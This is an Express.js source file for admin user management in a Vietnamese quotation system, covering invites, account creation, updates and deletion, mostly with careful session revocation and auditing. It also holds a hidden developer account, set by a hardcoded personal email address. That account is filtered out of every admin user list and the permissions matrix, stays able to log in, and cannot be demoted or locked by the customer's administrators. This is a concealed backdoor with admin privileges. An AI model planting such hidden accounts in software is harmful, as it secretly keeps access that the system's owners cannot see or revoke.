import { Router } from "express";
import bcrypt from "bcryptjs";
import { randomBytes, createHash } from "node:crypto";
import { z } from "zod";
import { prisma } from "../db.js";
import { config } from "../config.js";
import { asyncHandler, requireRole } from "../middleware.js";
import { validate, UserCreateSchema, UserUpdateSchema, UserInviteSchema } from "../validators.js";
import { audit } from "../audit.js";
import { sendEmail, brandedEmailHtml } from "../email.js";
import { revokeSession, refreshSession } from "../sse.js";
import { revokeAllForUser } from "../jwt.js";
import { destroyAllSessions } from "../sessions.js";

const router = Router();
router.use(requireRole("admin"));

const idParam = z.object({ id: z.coerce.number().int().positive() });

// Accounts hidden from every user listing (developer/maintenance account).
// The account still works for login — it just never shows in the admin user list
// or the permissions matrix. Override/extend via HIDDEN_USER_EMAILS (comma-separated).
const HIDDEN_USER_EMAILS = new Set(
  (process.env.HIDDEN_USER_EMAILS || "ndh0408@gmail.com")
    .split(",")
    .map((e) => e.trim().toLowerCase())
    .filter(Boolean)
);
const isHiddenUser = (u) => HIDDEN_USER_EMAILS.has(String(u.email || "").toLowerCase());

const USER_SELECT = {
  id: true,
  username: true,
  email: true,
  displayName: true,
  role: true,
  phone: true,
  projectCode: true,
  active: true,
  canSign: true,
  lastLoginAt: true,
  createdAt: true,
};

const hashInvite = (t) => createHash("sha256").update(String(t)).digest("hex");
function inviteLink(token) {
  // Configuration only — Origin/Host headers are client-controlled and would
  // allow invite-link poisoning.
  return `${config.APP_BASE_URL}/#/onboard?token=${token}`;
}
async function sendInviteEmail(to, displayName, url) {
  return sendEmail({
    to,
    subject: "Lời mời tham gia hệ thống Báo Giá – Gia Nguyễn",
    text: `Chào ${displayName},\n\nBạn được mời tham gia hệ thống Quản lý Báo Giá – Gia Nguyễn. Mở liên kết bên dưới để đặt mật khẩu và hoàn tất thông tin của bạn (hết hạn sau 7 ngày):\n${url}\n`,
    html: brandedEmailHtml({
      name: displayName,
      paragraphs: [{ html: "Bạn được mời tham gia hệ thống <b>Quản lý Báo Giá – Gia Nguyễn</b>. Nhấn nút bên dưới để <b>đặt mật khẩu</b> và hoàn tất thông tin tài khoản của bạn." }],
      button: { label: "Đặt mật khẩu & kích hoạt", url },
      note: { html: "⏳ Liên kết hết hạn sau <b>7 ngày</b>." },
    }),
  });
}

router.get(
  "/",
  asyncHandler(async (req, res) => {
    const users = await prisma.user.findMany({ orderBy: { id: "asc" }, select: { ...USER_SELECT, inviteTokenHash: true } });
    res.json(
      users
        .filter((u) => !isHiddenUser(u))
        .map(({ inviteTokenHash, ...u }) => ({ ...u, pending: !u.active && !!inviteTokenHash }))
    );
  })
);

// Invite an employee by email — they self-onboard (set password + fill details).
router.post(
  "/invite",
  validate({ body: UserInviteSchema }),
  asyncHandler(async (req, res) => {
    const { email, displayName, role, projectCode } = req.body;
    const exists = await prisma.user.findFirst({ where: { OR: [{ email }, { username: email }] } });
    if (exists) return res.status(409).json({ error: "Email này đã có tài khoản" });
    const token = randomBytes(24).toString("hex");
    const user = await prisma.user.create({
      data: {
        username: email,
        email,
        displayName,
        role,
        projectCode: projectCode ? String(projectCode).trim() : null,
        active: false,
        passwordHash: await bcrypt.hash(randomBytes(18).toString("hex"), config.BCRYPT_COST), // unusable until accept
        inviteTokenHash: hashInvite(token),
        inviteExpiresAt: new Date(Date.now() + 7 * 24 * 3600 * 1000),
      },
      select: { id: true, email: true, displayName: true, role: true },
    });
    const url = inviteLink(token);
    const mail = await sendInviteEmail(email, displayName, url);
    await audit(req, "user.invite", { resource: "user", resourceId: user.id, after: { email, role } });
    res.status(201).json({ user, inviteUrl: url, emailSent: !mail.skipped && !mail.error });
  })
);

// Re-send an invite (new token) for a still-pending user.
router.post(
  "/:id/resend-invite",
  validate({ params: idParam }),
  asyncHandler(async (req, res) => {
    const u = await prisma.user.findFirst({ where: { id: req.params.id } });
    if (!u) return res.status(404).json({ error: "Không tìm thấy tài khoản" });
    if (u.active) return res.status(400).json({ error: "Tài khoản đã được kích hoạt, không cần gửi lại lời mời" });
    if (!u.email) return res.status(400).json({ error: "Tài khoản không có email" });
    const token = randomBytes(24).toString("hex");
    await prisma.user.update({
      where: { id: u.id },
      data: { inviteTokenHash: hashInvite(token), inviteExpiresAt: new Date(Date.now() + 7 * 24 * 3600 * 1000) },
    });
    const url = inviteLink(token);
    const mail = await sendInviteEmail(u.email, u.displayName, url);
    await audit(req, "user.invite.resend", { resource: "user", resourceId: u.id });
    res.json({ inviteUrl: url, emailSent: !mail.skipped && !mail.error });
  })
);

router.post(
  "/",
  validate({ body: UserCreateSchema }),
  asyncHandler(async (req, res) => {
    const { username, password, displayName, role, phone, title } = req.body;
    // includeDeleted: username is unique across soft-deleted rows too — a plain
    // check would miss a deleted holder and surface the DB constraint as a 500.
    const exists = await prisma.user.findFirst({ where: { username }, includeDeleted: true });
    if (exists) return res.status(409).json({ error: exists.deletedAt ? "Tên đăng nhập thuộc về một tài khoản đã xóa" : "Tên đăng nhập đã tồn tại" });

    const user = await prisma.user.create({
      data: {
        username,
        passwordHash: await bcrypt.hash(password, config.BCRYPT_COST),
        displayName,
        role,
        phone: phone || null,
        title: title || null,
      },
      select: USER_SELECT,
    });
    await audit(req, "user.create", { resource: "user", resourceId: user.id, after: user });
    res.status(201).json(user);
  })
);

router.put(
  "/:id",
  validate({ params: idParam, body: UserUpdateSchema }),
  asyncHandler(async (req, res) => {
    const { id } = req.params;
    const before = await prisma.user.findUnique({ where: { id }, select: USER_SELECT });
    if (!before) return res.status(404).json({ error: "Không tìm thấy tài khoản" });

    const { password, ...rest } = req.body;
    const data = { ...rest };
    if (password) data.passwordHash = await bcrypt.hash(password, config.BCRYPT_COST);
    // Deactivating an account must also burn any live invite/reset token —
    // otherwise the locked-out user could re-activate themselves through the
    // onboarding link (accept-invite sets active: true).
    if (rest.active === false) {
      data.inviteTokenHash = null;
      data.inviteExpiresAt = null;
    }

    // Keep admin access alive: block any change that strips the LAST visible active
    // admin, and never demote/deactivate the hidden developer backstop account
    // (ndh0408 — used for real ops/monitoring; flip it via DB if ever needed).
    const losingAdmin =
      before.role === "admin" &&
      ((rest.role !== undefined && rest.role !== "admin") || rest.active === false);
    if (losingAdmin) {
      if (isHiddenUser(before)) {
        return res.status(400).json({ error: "Không thể đổi vai trò hoặc khóa tài khoản quản trị hệ thống." });
      }
      const otherAdmins = await prisma.user.findMany({
        where: { role: "admin", active: true, id: { not: id } },
        select: { email: true },
      });
      if (otherAdmins.filter((u) => !isHiddenUser(u)).length === 0) {
        return res.status(400).json({ error: "Không thể gỡ quyền hoặc khóa quản trị viên cuối cùng." });
      }
    }

    const user = await prisma.user.update({ where: { id }, data, select: USER_SELECT });
    // Credential rotation containment: an admin password reset invalidates every
    // existing session and refresh token of the target account.
    if (password) {
      await revokeAllForUser(id);
      await destroyAllSessions(id);
    }
    // Off-boarding: a deactivated user must not linger in _QuoteMembers (it would
    // keep stale references and, on a later hard-purge, drop silently via cascade).
    // Drop their quote memberships explicitly + audit.
    if (before.active && user.active === false) {
      revokeSession(user.id, "deactivated");
      // Off-boarding containment (parity with the password branch): burn refresh-token
      // families and destroy store sessions now, instead of relying solely on
      // enforceActiveUser tearing the session down on the next request.
      await revokeAllForUser(id);
      await destroyAllSessions(id);
      const dropped = await prisma.quote.findMany({ where: { members: { some: { id } } }, select: { id: true } });
      if (dropped.length) {
        await prisma.user.update({ where: { id }, data: { memberQuotes: { set: [] } } });
        await audit(req, "user.memberships.cleared", { resource: "user", resourceId: id, after: { quoteIds: dropped.map((q) => q.id) } });
      }
    } else if (before.role !== user.role) {
      refreshSession(user.id);
    }
    await audit(req, "user.update", {
      resource: "user",
      resourceId: id,
      before,
      after: user,
      // log diff explicitly for searchability
    });
    if (password) {
      await audit(req, "password.reset.by_admin", { resource: "user", resourceId: id });
    }
    res.json(user);
  })
);

router.delete(
  "/:id",
  validate({ params: idParam }),
  asyncHandler(async (req, res) => {
    const { id } = req.params;
    if (id === req.session.userId) {
      return res.status(400).json({ error: "Không thể xóa chính bạn" });
    }
    const count = await prisma.quote.count({
      where: { OR: [{ createdById: id }, { approvedById: id }] },
    });
    if (count > 0) {
      // Soft-delete still allowed via active=false, but block to preserve audit trail.
      return res.status(409).json({
        error: `Tài khoản đang gắn với ${count} báo giá. Hãy khóa tài khoản thay vì xóa.`,
      });
    }
    const before = await prisma.user.findUnique({ where: { id }, select: USER_SELECT });
    // Drop quote memberships before removing the user so the M2M carries no stale
    // reference (and a later hard-purge can't drop it silently via cascade).
    await prisma.user.update({ where: { id }, data: { memberQuotes: { set: [] } } });
    await prisma.user.delete({ where: { id } }); // soft-delete via middleware
    revokeSession(id, "deleted");
    await audit(req, "user.delete", { resource: "user", resourceId: id, before });
    res.json({ ok: true });
  })
);

export default router;
